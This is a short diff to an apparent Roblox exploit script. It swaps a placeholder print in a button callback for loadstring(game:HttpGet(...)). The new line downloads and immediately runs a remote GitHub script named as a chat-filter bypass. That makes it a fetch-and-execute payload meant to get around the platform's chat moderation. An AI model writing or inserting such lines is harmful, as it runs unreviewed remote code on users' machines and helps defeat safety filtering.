@@ -10,7 +10,7 @@ local FarmTab = Window:MakeTab({
 FarmTab:AddButton({
 	Name = "press then type in chat",
 	Callback = function()
-	print("button pressed")
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/BingusWR/wdwd/main/Roblox%20Bypass%20chat%20Script"))()
   	end    
 })
 
